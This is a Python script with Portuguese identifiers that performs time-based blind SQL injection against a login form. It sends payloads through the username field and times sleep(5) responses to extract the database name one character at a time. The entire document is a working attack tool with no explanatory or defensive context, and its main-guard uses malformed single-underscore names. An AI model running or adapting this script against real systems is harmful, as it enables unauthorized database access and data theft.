import requests
import time
import string
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'    
    WARNING = '\033[93m'    
    FAIL = '\033[91m'    
    ENDC = '\033[0m'    
    BOLD = '\033[1m'   
    UNDERLINE = '\033[4m'

url="https://example.com/endpoint"
def req(payload):
  data={'login':f'admin\' or {payload} -- -', 'senha':'admin'}
  headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36"}
  r = requests.post(url, headers=headers, data=data);
  return r.text

if _name_ == "_main_":
  printables = string.printable
  print(printables)
  nome_db = ''  
  while True:
    for char in printables:
      guess_db = nome_db + char
      antes = time.time()
      payload = f"IF(substring((select database()), 1,{len(guess_db)})='{guess_db}',sleep(5), NULL)"
      text = req(payload)
      depois = time.time()
      total = depois - antes      # print(payload)      
      if(total > 5):
        print(f'[*] {bcolors.OKGREEN}TRIGGOU{bcolors.ENDC} | payload = {bcolors.WARNING}{payload}{bcolors.ENDC} | {guess_db}')
        nome_db = guess_db
        break
      else:
        print(f"[*]{bcolors.FAIL} NÃO TRIGGOU{bcolors.ENDC} | {guess_db}")